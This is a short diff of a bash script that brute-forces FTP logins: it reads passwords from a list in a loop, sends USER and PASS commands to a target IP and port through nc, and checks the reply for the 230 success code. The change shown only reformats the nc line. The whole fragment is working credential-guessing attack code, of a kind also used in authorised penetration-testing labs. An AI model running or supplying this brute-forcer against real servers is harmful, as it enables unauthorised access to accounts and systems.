@@ -11,7 +11,7 @@ while read -r PASSWORD; do
   echo "Trying password: ${PASSWORD}"
 
   # Attempt FTP login
-  res=$(echo -e "USER ${USERNAME}\r\nPASS ${PASSWORD}\r\nQUIT" | nc $IP $PORT)
+res=$(echo -e "USER ${USERNAME}\r\nPASS ${PASSWORD}\r\nQUIT" | nc ${IP} ${PORT})
 
   # Check the FTP server response for successful authentication
   if echo "${res}" | grep -q "230"; then
